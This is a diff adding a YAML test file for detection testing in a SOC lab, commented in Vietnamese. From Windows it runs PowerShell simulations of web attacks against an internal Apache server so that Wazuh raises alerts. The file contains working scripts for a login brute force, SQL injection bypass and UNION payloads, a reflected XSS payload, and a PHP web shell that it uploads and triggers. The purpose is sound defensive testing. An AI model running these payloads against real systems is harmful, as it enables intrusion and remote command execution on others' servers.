@@ -1,0 +1,182 @@
+attack_technique: T1190
+display_name: Web Application Attack Simulation (SQLi, XSS, Brute Force)
+
+description: >
+  Mô phỏng các cuộc tấn công phổ biến vào ứng dụng web (OWASP Top 10) từ máy Windows
+  sang máy chủ Ubuntu nội bộ. Kịch bản thực hiện Web Brute Force, SQL Injection
+  (Auth Bypass & Union-based), Reflected XSS và mô phỏng Upload Web Shell.
+  Sinh logs rõ ràng trên Apache2 (/var/log/apache2/access.log & error.log) để Wazuh phân tích.
+
+author: SOC Lab
+version: 1.0
+platform: windows
+category: web-attacks
+severity: high
+mode: simulation
+scope: cross-host
+safe: true
+
+mitre_techniques:
+  - T1190
+  - T1110.001
+  - T1505.003
+
+requirements:
+  os: [Windows 10, Windows 11]
+  software: [PowerShell 5.1+, curl.exe]
+  network: [LAN connection to Ubuntu target]
+  pre_run:
+    - Đảm bảo máy Ubuntu (192.168.1.164) đang chạy Apache2 và truy cập được từ Windows.
+    - Đảm bảo Wazuh Agent trên Ubuntu đang monitor file /var/log/apache2/access.log.
+
+environment:
+  target_ip: 192.168.1.164
+  http_port: 80
+  output_dir: C:\Temp\WebLab
+
+atomic_tests:
+
+# ------------------------------------------------------------------
+# BƯỚC 1 - T1110.001: Web Brute Force qua login.php
+# ------------------------------------------------------------------
+- name: '[1] T1110.001 - Web Login Brute Force'
+  auto_generated_guid: WEBATTACK-1111-0000-0000-000000000001
+  description: >
+    Thực hiện gửi liên tục các request POST chứa mật khẩu sai đến trang login.php.
+    Tạo ra nhiều bản ghi HTTP 200/401 (tùy code PHP) trong thời gian ngắn.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: IP máy chủ Ubuntu
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $passwords = @("123456", "password", "admin", "admin123", "root", "qwerty", "letmein")
+      Write-Host "[T1110.001] Bắt đầu Web Brute Force vào http://$target/login.php"
+      
+      foreach ($pw in $passwords) {
+        $body = @{ username="admin"; password=$pw }
+        try {
+          Invoke-WebRequest -Uri "http://$target/login.php" -Method POST -Body $body -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+          Write-Host " -> Thử user: admin | pass: $pw"
+        } catch {}
+        Start-Sleep -Milliseconds 200
+      }
+      Write-Host "[T1110.001] Hoàn tất Brute Force."
+
+# ------------------------------------------------------------------
+# BƯỚC 2 - T1190: SQL Injection (Auth Bypass & Union)
+# ------------------------------------------------------------------
+- name: '[2] T1190 - SQL Injection (Auth Bypass & Data Extraction)'
+  auto_generated_guid: WEBATTACK-2222-0000-0000-000000000002
+  description: >
+    Gửi payload SQLi cơ bản để bypass đăng nhập (login.php) và 
+    dò tìm cơ sở dữ liệu (search.php). Sinh signature SQLi rõ ràng trong access.log.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: IP máy chủ Ubuntu
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      Write-Host "[T1190] Bắn payload SQL Injection..."
+      
+      # 1. Auth Bypass ở login.php
+      $sqli_login = @{ username="admin' OR 1=1 --"; password="any" }
+      try {
+        Invoke-WebRequest -Uri "http://$target/login.php" -Method POST -Body $sqli_login -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+        Write-Host " -> Đã gửi Auth Bypass Payload đến login.php"
+      } catch {}
+
+      # 2. Union Based ở search.php (Cố tình dùng User-Agent sqlmap để test Rule)
+      $sqli_search = "admin' UNION SELECT 1, @@version, database() -- "
+      $encoded_payload = [uri]::EscapeDataString($sqli_search)
+      try {
+        Invoke-WebRequest -Uri "http://$target/search.php?q=$encoded_payload" -Method GET -Headers @{"User-Agent"="sqlmap/1.5.2#dev (http://sqlmap.org)"} -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+        Write-Host " -> Đã gửi Union Payload đến search.php (với sqlmap User-Agent)"
+      } catch {}
+
+# ------------------------------------------------------------------
+# BƯỚC 3 - T1190: Reflected XSS
+# ------------------------------------------------------------------
+- name: '[3] T1190 - Cross-Site Scripting (Reflected XSS)'
+  auto_generated_guid: WEBATTACK-3333-0000-0000-000000000003
+  description: >
+    Chèn mã JavaScript độc hại vào tham số tìm kiếm của search.php.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: IP máy chủ Ubuntu
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $xss_payload = "<script>alert('XSS_Test_SOC')</script>"
+      $encoded_xss = [uri]::EscapeDataString($xss_payload)
+      
+      Write-Host "[T1190] Gửi XSS Payload đến search.php..."
+      try {
+        Invoke-WebRequest -Uri "http://$target/search.php?q=$encoded_xss" -Method GET -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+        Write-Host " -> Hoàn tất gửi XSS."
+      } catch {}
+
+# ------------------------------------------------------------------
+# BƯỚC 4 - T1505.003: Web Shell Upload Simulation
+# ------------------------------------------------------------------
+- name: '[4] T1505.003 - Malicious File Upload (Web Shell)'
+  auto_generated_guid: WEBATTACK-4444-0000-0000-000000000004
+  description: >
+    Tạo một file PHP chứa mã thực thi hệ thống giả lập và dùng curl 
+    để upload qua multipart/form-data lên upload.php.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: IP máy chủ Ubuntu
+      type: string
+      default: '192.168.1.164'
+    output_dir:
+      description: Thư mục tạm để tạo file
+      type: string
+      default: 'C:\Temp\WebLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $dir = "#{output_dir}"
+      if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
+      
+      $shell_path = "$dir\c99_shell_sim.php"
+      "<?php system(`$_GET['cmd']); ?>" | Out-File -FilePath $shell_path -Encoding ASCII
+      
+      Write-Host "[T1505.003] Đang upload Web Shell qua upload.php..."
+      # Sử dụng curl.exe (có sẵn trên Windows) để xử lý form upload dễ dàng hơn
+      $curl_cmd = "curl.exe -s -X POST -F `"fileToUpload=@$shell_path`" http://$target/upload.php"
+      Invoke-Expression $curl_cmd | Out-Null
+      
+      Write-Host " -> Đã gửi request upload. Kích hoạt thử shell..."
+      try {
+        Invoke-WebRequest -Uri "http://$target/uploads/c99_shell_sim.php?cmd=whoami" -Method GET -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      
+      Write-Host "[T1505.003] Hoàn tất."
+  cleanup_command: |
+    Remove-Item "C:\Temp\WebLab\c99_shell_sim.php" -Force -ErrorAction SilentlyContinue
+
+post_conditions:
+  wazuh_alerts:
+    - 'Web attack: SQL Injection (T1190) - HIGH'
+    - 'Web attack: XSS Attempt (T1190) - HIGH'
+    - 'Suspicious User-Agent (sqlmap) - HIGH'
+    - 'Multiple HTTP 401/200 from same IP in short time (Web Brute Force)'
